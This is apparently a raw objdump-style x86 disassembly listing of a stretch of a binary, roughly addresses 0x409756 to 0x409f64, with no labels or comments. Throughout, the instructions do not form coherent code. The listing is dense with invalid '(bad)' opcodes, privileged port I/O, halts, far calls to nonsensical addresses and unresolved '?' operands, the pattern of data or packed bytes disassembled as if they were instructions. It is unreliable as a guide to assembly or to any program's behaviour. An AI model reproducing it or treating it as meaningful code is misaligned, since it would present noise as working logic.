  409756:	in     al,dx
  409757:	dec    edi
  409758:	inc    ebp
  409759:	sbb    DWORD PTR ds:0x77e90009,esi
  40975f:	into   
  409760:	out    dx,eax
  409761:	cdq    
  409762:	sar    ebp,0xf3
  409765:	xchg   ebx,eax
  409766:	xor    cl,BYTE PTR [eax+0x1d009915]
  40976c:	retf   0xe1ff
  40976f:	repnz std 
  409771:	push   es
  409772:	scas   al,BYTE PTR es:[edi]
  409773:	ja     0x4097ee
  409775:	add    cl,ch
  409777:	xor    cl,BYTE PTR [ecx]
  409779:	call   FWORD PTR [ecx+ebx*4-0x79]
  40977d:	adc    eax,0xffc9f435
  409782:	jno    0x40977b
  409784:	js     0x40974f
  409786:	stos   BYTE PTR es:[edi],al
  409787:	pop    edi
  409788:	xchg   esp,eax
  409789:	in     al,dx
  40978a:	push   0x76
  40978c:	nop
  40978d:	lea    esp,[edx*1-0xe399827]
  409794:	leave  
  409795:	call   DWORD PTR [eax-0x690094c9]
  40979b:	inc    edx
  40979c:	adc    al,0xc0
  40979e:	adc    eax,0x717d8c2b
  4097a3:	data16 (bad) 
  4097a5:	push   0x6c
  4097a7:	out    dx,eax
  4097a8:	js     0x4097fa
  4097aa:	sbb    DWORD PTR [edi-0x5016ffb8],0x31c77848
  4097b4:	mov    edi,0x18025e45
  4097b9:	mov    dh,0xac
  4097bb:	mov    al,ds:0xef970ed8
  4097c0:	test   DWORD PTR [eax+0x0],edx
  4097c3:	daa    
  4097c4:	loope  0x40980a
  4097c6:	cld    
  4097c7:	enter  0xb609,0x45
  4097cb:	arpl   WORD PTR [edx],di
  4097cd:	movzx  eax,BYTE PTR [eax]
  4097d0:	int    0x94
  4097d2:	push   eax
  4097d3:	movd   mm1,edi
  4097d6:	clc    
  4097d7:	push   eax
  4097d8:	pop    ss
  4097d9:	loope  0x40981f
  4097db:	clc    
  4097dc:	mov    eax,0x1e45b709
  4097e1:	cmp    cl,BYTE PTR [edi]
  4097e3:	mov    bh,0x9d
  4097e5:	sahf   
  4097e6:	push   eax
  4097e7:	call   FWORD PTR [ebp-0x66]
  4097ea:	push   0xffcb97e4
  4097ef:	mov    WORD PTR [ebp-0x4917affa],cs
  4097f5:	dec    ebp
  4097f6:	add    BYTE PTR [eax],al
  4097f8:	pop    ebx
  4097f9:	push   ecx
  4097fa:	xor    al,0x8d
  4097fc:	or     eax,0x16e85089
  409801:	(bad)  
  409802:	(bad)  
  409803:	dec    DWORD PTR [eax-0x78]
  409806:	inc    ebp
  409807:	mov    WORD PTR [eax+0x25],cs
  40980a:	fisttp WORD PTR [edi+0x49]
  40980d:	or     eax,0x9668ede8
  409812:	(bad)  
  409813:	call   0x405954
  409818:	ror    DWORD PTR [edx+0x55],0x8b
  40981c:	mov    ah,0x8c
  40981e:	les    ebp,FWORD PTR [edi+eiz*4]
  409821:	xchg   esi,eax
  409822:	call   DWORD PTR [ebx+0x4f]
  409825:	and    eax,DWORD PTR [eax]
  409827:	push   0x58
  409829:	xchg   edi,eax
  40982a:	jne    0x409834
  40982c:	mov    al,0x8a
  40982e:	sar    edi,1
  409830:	mov    DWORD PTR [ebx],0x6000fc45
  409836:	or     eax,0x96a6ef00
  40983b:	jne    0x409845
  40983d:	xor    eax,ecx
  40983f:	lahf   
  409840:	shl    BYTE PTR [esi],1
  409842:	xlat   BYTE PTR ds:[ebx]
  409843:	sbb    ebx,DWORD PTR [ecx+esi*1-0x5372fc90]
  40984a:	dec    edi
  40984b:	mov    ?,edi
  40984d:	push   ds
  40984e:	mov    al,ds:0x36fd589b
  409853:	pop    edi
  409855:	mov    ah,0x8f
  409857:	mov    ?,edi
  409859:	push   es
  40985a:	add    al,0x4
  40985c:	add    BYTE PTR [ecx],dh
  40985e:	in     eax,dx
  40985f:	mov    BYTE PTR [eax-0xa],ah
  409862:	push   ss
  409863:	(bad)  
  409864:	push   eax
  409865:	(bad)  
  409867:	dec    esi
  409868:	add    BYTE PTR [ecx],dh
  40986a:	pop    ebx
  40986b:	mov    esp,0x50ed032b
  409870:	je     0x409848
  409872:	jbe    0x409802
  409874:	jmp    0x409898
  409876:	lock int 0xff
  409879:	cmp    eax,0x3101496d
  40987e:	jo     0x409883
  409880:	or     esp,ebx
  409882:	fild   DWORD PTR [edx]
  409884:	(bad)  
  409885:	ss jo  0x4098ce
  409888:	inc    ecx
  409889:	mov    al,0x48
  40988b:	add    DWORD PTR [eax],0x31
  40988e:	jo     0x4098a1
  409890:	in     eax,0x2a
  409892:	mov    al,0x17
  409894:	push   ss
  409895:	sbb    DWORD PTR [ebx+eax*1-0xacf0000],ecx
  40989c:	xchg   DWORD PTR [eax+0x7e],esp
  40989f:	sahf   
  4098a0:	mov    ss,WORD PTR [eax+0x76]
  4098a3:	sbb    al,0xfc
  4098a5:	out    0xad,eax
  4098a7:	lahf   
  4098a8:	mov    ?,edi
  4098aa:	pop    edx
  4098ab:	jae    0x4098c6
  4098ad:	add    bl,cl
  4098af:	outs   dx,DWORD PTR ds:[esi]
  4098b0:	mov    ?,WORD PTR [ebp+0x29]
  4098b3:	mov    BYTE PTR [ebp-0x30],bl
  4098b6:	dec    esi
  4098b7:	or     BYTE PTR [esi-0x65],ah
  4098ba:	je     0x40983f
  4098bc:	pop    esi
  4098bd:	mov    fs,ecx
  4098bf:	test   esp,ebx
  4098c1:	sti    
  4098c2:	dec    esi
  4098c3:	repnz cmp BYTE PTR [esi+0x7e8f22e],cl
  4098ca:	xor    DWORD PTR [ecx],ecx
  4098cc:	push   ecx
  4098cd:	lds    eax,FWORD PTR [edx]
  4098cf:	test   DWORD PTR [esi],esi
  4098d1:	jl     0x40987f
  4098d3:	in     eax,0x2d
  4098d5:	mov    cs,WORD PTR [esi]
  4098d7:	repnz and eax,0x1e093102
  4098dd:	pop    eax
  4098de:	pop    ebp
  4098df:	test   BYTE PTR [esi],dl
  4098e1:	mov    cs,WORD PTR [ecx+0x3103f907]
  4098e7:	icebp  
  4098e8:	call   0x1149c9f4
  4098ed:	call   0x3429a291
  4098f2:	(bad)  
  4098f3:	mov    esi,0x84ce8e8d
  4098f8:	out    0x17,al
  4098fa:	cmp    DWORD PTR [ecx+0x46],esi
  4098fd:	mov    ah,0x0
  4098ff:	mov    esi,0x328d4184
  409904:	or     ecx,ebp
  409906:	mov    esp,fs
  409908:	in     eax,0xc5
  40990a:	lea    esp,[esi-0x610c180f]
  409910:	test   BYTE PTR [ecx+0x4],al
  409913:	sub    eax,0x8d9be909
  409918:	ret    
  409919:	jmp    0x54c47a21
  40991e:	xor    BYTE PTR [esi-0x7c],bh
  409921:	xchg   esi,eax
  409922:	(bad)  
  409923:	cld    
  409924:	adc    BYTE PTR [ecx-0x797b8132],al
  40992a:	pushf  
  40992b:	ins    BYTE PTR es:[edi],dx
  40992c:	xchg   BYTE PTR [esi-0x73],bh
  40992f:	add    DWORD PTR [eax+eax*1-0x593a504],eax
  409936:	sahf   
  409937:	mov    esp,0xb4b8e884
  40993c:	test   bh,bh
  40993e:	ins    BYTE PTR es:[edi],dx
  40993f:	mov    dh,0xe1
  409941:	(bad)  
  409942:	push   esi
  409943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409944:	fldenv [edi+0x2e]
  409947:	ins    BYTE PTR es:[edi],dx
  409948:	retf   0x50ff
  40994b:	loop   0x4099b5
  40994d:	(bad)  
  40994e:	ds call 0x8383:0xa436548e
  409956:	ins    BYTE PTR es:[edi],dx
  409957:	dec    ecx
  409958:	test   bh,bh
  40995a:	es sub eax,0x6e6a44fd
  409960:	loope  0x409960
  409962:	push   ss
  409963:	add    BYTE PTR [esp+ebx*1-0x724e328e],ah
  40996a:	pop    eax
  40996b:	push   es
  40996c:	mov    ah,0x83
  40996e:	add    al,0xfe
  409970:	xchg   ecx,esp
  409972:	(bad)  
  409973:	mul    BYTE PTR [ebp-0x551e8a7d]
  409979:	mov    ebx,0x87b5e6cf
  40997e:	lods   eax,DWORD PTR ds:[esi]
  40997f:	inc    ecx
  409980:	lods   al,BYTE PTR ds:[esi]
  409981:	cmp    edi,0xffffffed
  409984:	sbb    BYTE PTR [edi+edi*8-0x599452ac],al
  40998b:	mov    dh,0xb5
  40998d:	cmp    edi,0x74
  409990:	dec    edx
  409991:	test   bh,bh
  409993:	mov    dh,0xa5
  409995:	mov    ebp,0x83bdae54
  40999a:	call   FWORD PTR [eax*4-0x52515895]
  4099a1:	sub    ebx,0xffffffe5
  4099a4:	sbb    BYTE PTR [ecx],cl
  4099a6:	push   0xffffffe9
  4099a8:	mov    ebp,0xc00007fd
  4099ad:	ror    esi,1
  4099af:	(bad)  
  4099b0:	fist   WORD PTR [ebp+esi*4-0x6b20ac]
  4099b7:	call   0x40534c
  4099bc:	iret   
  4099bd:	ficomp DWORD PTR [ebx-0x1]
  4099c0:	fist   WORD PTR [eax+ebp*8-0x6b0543]
  4099c7:	sub    eax,DWORD PTR [eax]
  4099c9:	arpl   WORD PTR [esi],bx
  4099cb:	sub    edx,DWORD PTR [eax-0x27]
  4099ce:	push   es
  4099cf:	call   0x47380f
  4099d4:	mov    DWORD PTR [ebp+0x5ffffe62],eax
  4099da:	mov    DWORD PTR [ebp-0x6ab0d4],edi
  4099e0:	add    BYTE PTR [esp+esi*2-0x3847e899],ah
  4099e7:	(bad)  
  4099e8:	inc    BYTE PTR [ebp+0x2ffffe62]
  4099ee:	sahf   
  4099ef:	mov    esp,0xb06c8bd
  4099f4:	rcl    BYTE PTR [eax+eax*4-0x74],0x95
  4099f9:	mov    BYTE PTR [ebp-0x71f50001],dl
  4099ff:	rol    BYTE PTR [ebx-0x3d],1
  409a02:	mov    bl,0x75
  409a04:	or     al,0x4d
  409a06:	mov    BYTE PTR [eax],dh
  409a08:	(bad)  
  409a09:	jg     0x409999
  409a0b:	push   eax
  409a0c:	call   0x406a99
  409a11:	add    ch,BYTE PTR [ecx-0x74]
  409a14:	test   DWORD PTR [eax+0x28ffff8f],ebx
  409a1a:	mov    ?,WORD PTR [ebp+0x8]
  409a1d:	mov    al,ds:0x9fffcf43
  409a22:	mov    ?,WORD PTR [ebp-0x4]
  409a25:	xor    DWORD PTR [ebx-0x45a6f7ef],ebx
  409a2b:	mov    ebx,0x2b6600ff
  409a30:	das    
  409a31:	leave  
  409a32:	jae    0x409aa0
  409a34:	add    edx,DWORD PTR [ebp-0x56]
  409a37:	mov    WORD PTR [ebp-0x7504a63c],es
  409a3d:	push   DWORD PTR [ebp+esi*4+0x5d3e5087]
  409a44:	idiv   esi
  409a46:	cld    
  409a47:	mov    eax,ds:0xc831413c
  409a4c:	sbb    al,0xbe
  409a4e:	xor    DWORD PTR [eax-0x2],esi
  409a51:	mov    edi,0xa2ed2e
  409a56:	xor    DWORD PTR [eax-0x3e],esi
  409a59:	inc    ebp
  409a5a:	or     DWORD PTR [eax+0x3],esi
  409a5d:	add    BYTE PTR [ecx],dh
  409a5f:	xor    eax,DWORD PTR [ecx-0xc]
  409a62:	(bad)  
  409a63:	push   0x3
  409a65:	add    BYTE PTR [ebx-0x43ffe290],cl
  409a6b:	in     al,dx
  409a6c:	xchg   edi,eax
  409a6d:	mul    esi
  409a6f:	or     dh,BYTE PTR [edx+ebp*2]
  409a72:	xor    ebp,esi
  409a74:	inc    eax
  409a75:	hlt    
  409a76:	sub    ebp,0x72c6f480
  409a7c:	mov    dl,BYTE PTR [eax-0x3a]
  409a7f:	in     al,0x8b
  409a81:	inc    DWORD PTR [esp+eiz*2-0x65]
  409a85:	push   esp
  409a86:	ja     0x409af7
  409a88:	add    ecx,DWORD PTR [ebx]
  409a8a:	jno    0x409a67
  409a8c:	add    cl,ch
  409a8e:	int3   
  409a8f:	outs   dx,DWORD PTR ds:[esi]
  409a90:	add    eax,DWORD PTR [eax]
  409a92:	add    BYTE PTR [edx-0x690868fc],dh
  409a98:	mov    edx,0xef3f7404
  409a9d:	inc    edi
  409a9e:	in     al,dx
  409a9f:	jle    0x409aa9
  409aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa2:	mov    dh,BYTE PTR [esi]
  409aa4:	std    
  409aa5:	jecxz  0x409a31
  409aa7:	in     al,dx
  409aa8:	add    BYTE PTR [edx+0x37cbd951],0x45
  409aaf:	xor    DWORD PTR [esp+ebp*2+0x7e81668f],edx
  409ab6:	xor    ecx,DWORD PTR [ecx-0x39]
  409ab9:	add    esi,DWORD PTR ss:[ecx]
  409abc:	push   cs
  409abd:	test   eax,0x6c93c00f
  409ac2:	fwait
  409ac3:	inc    esi
  409ac4:	sbb    DWORD PTR [esi+0x33],0x925d8ba4
  409acb:	cmp    DWORD PTR cs:[ecx+0x460d9c8a],0xa7d1e4d0
  409ad6:	add    ecx,DWORD PTR [ecx]
  409ad8:	inc    edi
  409ad9:	sbb    eax,0x29150e8a
  409ade:	punpcklbw mm2,DWORD PTR [edx-0x7ef96c94]
  409ae5:	push   ds
  409ae6:	sbb    esi,DWORD PTR [eax]
  409ae8:	or     DWORD PTR [esi],eax
  409aea:	dec    ecx
  409aeb:	out    dx,al
  409aec:	mul    al
  409aee:	fwait
  409aef:	outs   dx,BYTE PTR ds:[esi]
  409af0:	dec    edi
  409af1:	push   es
  409af2:	mov    dh,BYTE PTR [edx+0x920dbe]
  409af8:	(bad)  
  409af9:	sub    al,0x10
  409afc:	cmp    eax,0x3c8ae8f3
  409b01:	adc    ecx,edx
  409b03:	shr    ah,1
  409b05:	sbb    dh,0x9d
  409b08:	sub    esi,ebx
  409b0a:	out    0x88,eax
  409b0c:	and    al,0x11
  409b0e:	rcr    esp,0x74
  409b11:	add    dh,0x89
  409b14:	in     al,0x71
  409b16:	mov    dh,0x89
  409b18:	xchg   esi,eax
  409b19:	add    BYTE PTR [eax],0x7c
  409b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b1d:	js     0x409b1e
  409b1f:	scas   al,BYTE PTR es:[edi]
  409b20:	mov    eax,0x3f9107f6
  409b25:	dec    edi
  409b26:	call   FWORD PTR [esi-0x610f4958]
  409b2c:	mov    eax,0xa231e880
  409b31:	cmp    bh,0x86
  409b34:	push   ds
  409b35:	sub    ecx,0xff80a9d1
  409b3b:	jbe    0x409b7b
  409b3d:	jge    0x409b27
  409b3f:	cmc    
  409b40:	out    dx,eax
  409b41:	or     BYTE PTR [eax],al
  409b43:	xor    BYTE PTR [edi+0x11],dh
  409b46:	add    BYTE PTR [ebp+esi*4-0x2ed27e94],dh
  409b4d:	ja     0x409b4e
  409b4f:	dec    esi
  409b50:	sahf   
  409b51:	(bad)  
  409b52:	sti    
  409b53:	cdq    
  409b54:	test   eax,0xe63e0bf5
  409b59:	mov    ch,0x48
  409b5b:	test   al,0x0
  409b5d:	xor    dh,BYTE PTR [ecx+0x5b]
  409b60:	ins    BYTE PTR es:[edi],dx
  409b61:	sub    eax,0xf8290b09
  409b66:	test   BYTE PTR [ebx-0x18],dl
  409b69:	xor    cl,BYTE PTR [ecx]
  409b6b:	(bad)  
  409b6c:	lods   al,BYTE PTR ds:[esi]
  409b6d:	mov    edx,0x32e90008
  409b72:	dec    eax
  409b73:	inc    ebp
  409b74:	std    
  409b75:	test   eax,0x34e90007
  409b7a:	or     DWORD PTR [edx-0x17],ebp
  409b7d:	sub    al,0x9
  409b7f:	push   0xffffffe9
  409b81:	aas    
  409b82:	(bad)  
  409b83:	repz cmp DWORD PTR [esi-0x7a],eax
  409b87:	hlt    
  409b88:	(bad)  
  409b89:	test   eax,0x3fd6507f
  409b8e:	cmp    edi,0x2d70b954
  409b94:	add    BYTE PTR [ebp-0x37f4fff5],dh
  409b9a:	syscall 
  409b9c:	jmp    0x40a60f
  409ba1:	lock test BYTE PTR [edi+0x41],0x88
  409ba6:	nop
  409ba7:	jne    0x409bb5
  409ba9:	mov    al,ds:0xc7ffd411
  409bae:	cmp    ecx,DWORD PTR [ebx-0xc00fa30]
  409bb4:	div    DWORD PTR [edi-0x3fadaf70]
  409bba:	and    esp,edx
  409bbc:	inc    edi
  409bbe:	add    al,BYTE PTR [ebp-0x6f40ff10]
  409bc4:	(bad)  
  409bc5:	call   0x4057d6
  409bca:	bound  ecx,QWORD PTR [ebx]
  409bcc:	push   0xffcbe92e
  409bd1:	(bad)  
  409bd2:	mov    ebp,0x77fff79a
  409bd7:	xchg   ecx,eax
  409bd8:	xor    eax,0xffcbe0b6
  409bdd:	out    0x5c,eax
  409bdf:	mov    ch,0xff
  409be1:	call   DWORD PTR [ecx+0x57f7e3ff]
  409be7:	xchg   ecx,eax
  409be8:	push   0x0
  409bea:	mov    al,ds:0xd8415059
  409bef:	xchg   ecx,eax
  409bf0:	mov    ch,0xf0
  409bf2:	aas    
  409bf3:	xchg   ecx,eax
  409bf4:	(bad)  
  409bf5:	call   FWORD PTR [ebp-0x37beb828]
  409bfb:	mov    ds:0x86c7d3a6,al
  409c00:	mov    DWORD PTR [ebp-0x713c],eax
  409c06:	bound  eax,QWORD PTR ds:0xc3f94068
  409c0c:	(bad)  
  409c0d:	(bad)  
  409c0e:	xor    DWORD PTR [ebp+0x4fa6f794],ebx
  409c14:	xchg   DWORD PTR ds:0x4538e7,esi
  409c1a:	mov    eax,edi
  409c1c:	mov    dl,0xff
  409c1e:	mov    gs,ecx
  409c20:	sub    al,0x7e
  409c23:	scas   eax,DWORD PTR es:[edi]
  409c24:	xchg   DWORD PTR [ebx-0x70734400],eax
  409c2a:	push   DWORD PTR [esi+0x70]
  409c2d:	cmovns esi,DWORD PTR [edx+0x66f797d5]
  409c34:	pop    DWORD PTR [esp+esi*2]
  409c37:	icebp  
  409c38:	repnz dec eax
  409c3a:	call   0xc79b9d
  409c3f:	lds    edi,FWORD PTR [esi-0xceffe5]
  409c45:	inc    ebp
  409c46:	inc    esp
  409c48:	ja     0x409be5
  409c4a:	repz fild WORD PTR gs:[esi-0x713c1b01]
  409c52:	jmp    DWORD PTR [esi]
  409c54:	iret   
  409c55:	adc    BYTE PTR [eax],cl
  409c57:	or     DWORD PTR [edi+0x3f16ffb8],ebp
  409c5d:	push   ecx
  409c5e:	call   0xffc7d369
  409c63:	jl     0x409ccd
  409c65:	fwait
  409c66:	cmp    esp,ebp
  409c68:	es xchg edi,edi
  409c6b:	mov    esp,0xeeff8f03
  409c70:	push   ss
  409c71:	adc    DWORD PTR [eax],ecx
  409c73:	(bad)  [edx-0x48]
  409c76:	(bad)  
  409c77:	fiadd  WORD PTR [esi]
  409c79:	push   ecx
  409c7a:	in     al,0xde
  409c7c:	jle    0x409c04
  409c7e:	call   0xffc7bcbf
  409c83:	(bad)  
  409c84:	xor    al,0x98
  409c86:	idiv   DWORD PTR [esi+0x9be608]
  409c8c:	xor    ebx,DWORD PTR [ecx-0x22]
  409c8f:	xchg   BYTE PTR [esi-0x59713e4d],ch
  409c95:	jge    0x409c58
  409c97:	mov    gs,WORD PTR [esi+0x7d]
  409c9a:	mov    BYTE PTR [esi-0x79498724],0x8e
  409ca1:	jge    0x409cdf
  409ca3:	cld    
  409ca4:	mov    fs,WORD PTR [ebx+0x7d7e86af]
  409caa:	pop    esp
  409cab:	xchg   ebx,eax
  409cac:	jle    0x409d2b
  409cae:	sahf   
  409caf:	fwait
  409cb0:	(bad)  
  409cb1:	dec    ebp
  409cb2:	xchg   esi,eax
  409cb3:	xchg   BYTE PTR [esi-0x3d],ah
  409cb6:	nop
  409cb7:	pushf  
  409cb8:	popf   
  409cb9:	jle    0x409c41
  409cbb:	xchg   BYTE PTR [esi-0xd],dl
  409cbe:	jl     0x409c5b
  409cc0:	dec    ebx
  409cc1:	shr    ecx,0x3
  409cc4:	js     0x409d10
  409cc6:	loope  0x409ccb
  409cc8:	in     al,0x91
  409cca:	push   ebp
  409ccb:	sub    BYTE PTR [ebp+0x7c],0xd3
  409ccf:	add    ebx,DWORD PTR [ebx+0x3910560a]
  409cd5:	jno    0x409d30
  409cd7:	mov    bh,0x1e
  409cd9:	jge    0x409d4b
  409cdb:	inc    eax
  409cdc:	adc    eax,0x7033a5f2
  409ce1:	or     DWORD PTR [esi],esi
  409ce3:	adc    BYTE PTR [ecx],bh
  409ce5:	jno    0x409cac
  409ce7:	test   esi,edi
  409ce9:	jl     0x409c7c
  409ceb:	sbb    eax,0x86e8ca61
  409cf0:	add    BYTE PTR [ecx+edx*1+0x1],ah
  409cf4:	cs out 0x7c,eax
  409cf7:	push   cs
  409cf8:	sbb    esi,DWORD PTR [edi-0x29fc5827]
  409cfe:	div    al
  409d00:	fwait
  409d01:	jnp    0x409d7e
  409d03:	add    dh,dh
  409d05:	lods   al,BYTE PTR ds:[esi]
  409d06:	icebp  
  409d07:	lods   al,BYTE PTR ds:[esi]
  409d08:	cdq    
  409d09:	jne    0x409d14
  409d0b:	call   FWORD PTR [ebp+esi*4+0x64]
  409d0f:	das    
  409d10:	fdiv   QWORD PTR [esp+edi*2-0x35a24398]
  409d17:	dec    ebp
  409d19:	cs adc eax,ebp
  409d1c:	or     ebp,DWORD PTR [esi-0x48ae0084]
  409d22:	fld    DWORD PTR [eax-0x17]
  409d25:	lods   eax,DWORD PTR ds:[esi]
  409d26:	test   BYTE PTR [edi],0xc1
  409d29:	mov    ?,WORD PTR [ebp-0x1]
  409d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d2d:	lods   al,BYTE PTR ds:[esi]
  409d2e:	idiv   bl
  409d30:	sahf   
  409d31:	ds adc eax,ebp
  409d34:	mov    bl,0xa9
  409d36:	jl     0x409d37
  409d38:	mov    al,ds:0x1c000573
  409d3d:	fsubr  DWORD PTR [eax+ebp*2-0x17]
  409d41:	xor    ch,BYTE PTR [esi+edi*4+0x76]
  409d45:	ss or  eax,0x643af4ff
  409d4b:	push   edx
  409d4c:	pop    esp
  409d4d:	lods   al,BYTE PTR ds:[esi]
  409d4e:	jl     0x409d19
  409d50:	sub    ebp,DWORD PTR ds:0x62547c
  409d56:	leave  
  409d57:	xchg   DWORD PTR [ebp-0x23],edi
  409d5a:	xor    cl,BYTE PTR [esp+eax*4]
  409d5d:	or     esi,DWORD PTR [edx]
  409d5f:	or     DWORD PTR [eax],eax
  409d61:	ds ds or eax,0x7bd8b5e8
  409d68:	jmp    edx
  409d6a:	repnz cmc 
  409d6c:	setno  BYTE PTR [eax-0x4a16bf2f]
  409d73:	cmc    
  409d74:	or     eax,DWORD PTR [ecx]
  409d76:	fist   WORD PTR [esi-0x1]
  409d79:	push   cs
  409d7a:	pop    edx
  409d7b:	(bad)  
  409d7c:	or     eax,DWORD PTR [eax]
  409d7e:	ret    0x6807
  409d81:	push   0xffffffa9
  409d83:	(bad)  
  409d84:	jmp    DWORD PTR [edi+0x45]
  409d87:	aaa    
  409d88:	inc    ecx
  409d89:	add    bh,cl
  409d8b:	dec    edx
  409d8c:	mov    ch,0x48
  409d8e:	or     DWORD PTR ds:0x84ea19e8,eax
  409d94:	dec    DWORD PTR [ebx]
  409d96:	fmul   DWORD PTR [ebx]
  409d98:	push   ds
  409d99:	push   eax
  409d9a:	pop    eax
  409d9b:	xchg   BYTE PTR [ebp+0xc],dh
  409d9e:	cmp    cl,0xd1
  409da1:	dec    edi
  409da3:	aaa    
  409da4:	push   eax
  409da5:	inc    DWORD PTR [ebp+0x7d]
  409da8:	out    0x91,eax
  409daa:	iret   
  409dab:	test   bh,bh
  409dad:	call   0x405356
  409db2:	shl    BYTE PTR [esi+ecx*8+0x21bfff],0x68
  409dba:	add    BYTE PTR [edx],dh
  409dbc:	cmp    BYTE PTR [ecx+0x0],al
  409dbf:	inc    eax
  409dc0:	or     al,0x51
  409dc2:	inc    ecx
  409dc3:	pop    eax
  409dc4:	pop    ds
  409dc5:	add    al,BYTE PTR [eax]
  409dc7:	pop    eax
  409dc8:	xchg   eax,ebp
  409dca:	loope  0x409d65
  409dcc:	test   bh,bh
  409dce:	or     ecx,DWORD PTR [eax]
  409dd0:	or     al,0x1e
  409dd2:	push   eax
  409dd3:	call   0x704d135d
  409dd8:	xor    dl,dl
  409dda:	jmp    FWORD PTR [edi+0x36]
  409ddd:	push   eax
  409dde:	call   ebp
  409de0:	jle    0x409dc9
  409de2:	pop    ecx
  409de3:	dec    edi
  409de4:	test   edi,edi
  409de6:	call   0x405297
  409deb:	jo     0x409dca
  409ded:	int    0xff
  409def:	dec    edi
  409df0:	and    BYTE PTR [eax],al
  409df2:	push   0x4137c2
  409df7:	xor    DWORD PTR [eax+0x7070516b],ecx
  409dfd:	test   BYTE PTR ds:0x42b89f,dh
  409e03:	(bad)  
  409e05:	mov    cl,0xff
  409e07:	(bad)  
  409e08:	addr16 ret 
  409e0a:	je     0x409e2b
  409e0c:	mov    al,ds:0x743cff33
  409e11:	imul   esp,DWORD PTR [ecx],0xffffff83
  409e14:	pop    ebx
  409e15:	adc    DWORD PTR [eax+0x1],0x53
  409e19:	stc    
  409e1a:	pop    es
  409e1b:	mov    DWORD PTR [eax],edx
  409e1d:	cmp    edi,0x0
  409e20:	xchg   esi,eax
  409e21:	pop    eax
  409e22:	test   ebp,0x6e6cbb8e
  409e28:	ja     0x409ddd
  409e2a:	sub    DWORD PTR [edx+0x31],0xffffffc8
  409e2e:	in     eax,dx
  409e2f:	push   eax
  409e30:	lock outs dx,DWORD PTR ds:[esi]
  409e32:	jmp    0x409dcb
  409e34:	add    BYTE PTR [ecx],dh
  409e36:	add    al,0x68
  409e38:	xor    esi,DWORD PTR [eax+0x3]
  409e3b:	or     BYTE PTR [ecx+0x20],0x55
  409e3f:	call   DWORD PTR [esi+0x77]
  409e42:	inc    ebx
  409e43:	je     0x409e74
  409e45:	and    ah,dl
  409e47:	(bad)  
  409e48:	mov    esp,0x60e96b63
  409e4d:	jmp    0x409dd1
  409e4f:	push   eax
  409e50:	loope  0x409e34
  409e52:	clc    
  409e53:	pop    es
  409e54:	sbb    eax,ebx
  409e56:	cmp    edi,0xce3ec826
  409e5c:	push   ds
  409e5d:	retf   
  409e5e:	imul   esi,DWORD PTR [esi],0xffffffe7
  409e61:	ret    0x6882
  409e64:	jnp    0x409e07
  409e66:	(bad)  
  409e67:	inc    DWORD PTR [edi]
  409e69:	mov    ebp,0x20e9e80f
  409e6e:	cmp    edi,0x61
  409e71:	or     DWORD PTR [ecx+0x11116482],edi
  409e77:	dec    ebx
  409e78:	out    0x79,eax
  409e7a:	push   ss
  409e7b:	ins    BYTE PTR es:[edi],dx
  409e7c:	cmp    ecx,DWORD PTR [ebx+0xe]
  409e7f:	adc    esi,0xfffffff3
  409e82:	hlt    
  409e83:	imul   eax,DWORD PTR [eax],0x23
  409e86:	dec    ebx
  409e87:	inc    BYTE PTR [edx+0x3e146f8]
  409e8d:	fs mov ?,ebp
  409e90:	xchg   ch,ch
  409e92:	je     0x409ee7
  409e94:	add    al,0x1b
  409e96:	pop    es
  409e97:	fdivp  st(0),st
  409e99:	cs jno 0x409eb9
  409e9c:	dec    edi
  409e9d:	sahf   
  409e9e:	jns    0x409f00
  409ea0:	enter  0xf09a,0xeb
  409ea4:	add    al,0x31
  409ea6:	or     ecx,edx
  409ea8:	or     DWORD PTR [edi+0x79],esi
  409eab:	mov    dh,0x8c
  409ead:	hlt    
  409eae:	add    BYTE PTR [ecx+0x8],0x30
  409eb2:	or     ecx,ebp
  409eb4:	and    ah,0x80
  409eb7:	xchg   ecx,eax
  409eb8:	test   BYTE PTR [eax+0x710ee908],ch
  409ebe:	hlt    
  409ebf:	hlt    
  409ec0:	inc    eax
  409ec1:	sub    eax,0xc603e908
  409ec6:	or     edi,DWORD PTR [esi-0x8]
  409ec9:	ds jns 0x409ec8
  409ecc:	or     ecx,DWORD PTR [ecx-0x70]
  409ecf:	outs   dx,DWORD PTR ds:[esi]
  409ed0:	xor    BYTE PTR [esi],0x6d
  409ed3:	icebp  
  409ed4:	and    BYTE PTR [ecx+esi*2+0x78f4c251],0x56
  409edc:	in     eax,dx
  409edd:	push   esi
  409ede:	popa   
  409edf:	stc    
  409ee0:	push   ebp
  409ee1:	push   ss
  409ee2:	jns    0x409e7d
  409ee4:	add    BYTE PTR [ecx+eax*1+0x400f151],0x79
  409eec:	add    BYTE PTR [esi],dh
  409eee:	or     al,0x13
  409ef0:	call   0xffb8fbde
  409ef5:	bnd jb 0x409ef5
  409ef8:	adc    edx,DWORD PTR [ecx-0x16bf25f8]
  409efe:	add    dh,BYTE PTR [ecx-0x74]
  409f01:	cmp    BYTE PTR [ebx-0x36f9af88],dh
  409f07:	adc    al,ch
  409f09:	scas   al,BYTE PTR es:[edi]
  409f0a:	mov    al,0x78
  409f0c:	inc    DWORD PTR [ebx+0x18e16117]
  409f12:	mov    bl,0x78
  409f14:	or     ebp,DWORD PTR [ecx+0x37681ca9]
  409f1a:	or     cl,0xff
  409f1d:	cmp    BYTE PTR ds:0xb0ced0e6,cl
  409f23:	fsin   
  409f25:	cmp    al,0x3d
  409f27:	popa   
  409f28:	xor    BYTE PTR [edi-0x2a958750],bh
  409f2e:	or     cl,BYTE PTR [ebx-0x2f]
  409f31:	scas   al,BYTE PTR es:[edi]
  409f32:	mov    al,0x4
  409f34:	rcr    BYTE PTR ds:0x3855e149,0x72
  409f3b:	js     0x409f8c
  409f3d:	add    DWORD PTR [ebx+0x7d8eff59],0xdaf17577
  409f47:	sbb    esi,edi
  409f49:	jle    0x409efb
  409f4b:	jecxz  0x409f4c
  409f4d:	add    BYTE PTR [eax],al
  409f4f:	push   eax
  409f50:	fld    DWORD PTR [eax-0x17]
  409f53:	dec    edx
  409f54:	std    
  409f55:	push   eax
  409f56:	test   al,0x32
  409f58:	js     0x409f8f
  409f5a:	xchg   edi,eax
  409f5b:	cmc    
  409f5c:	enter  0x40ff,0x4
  409f60:	dec    eax
  409f61:	dec    DWORD PTR [esi-0x3]
  409f64:	jbe    0x409fdb
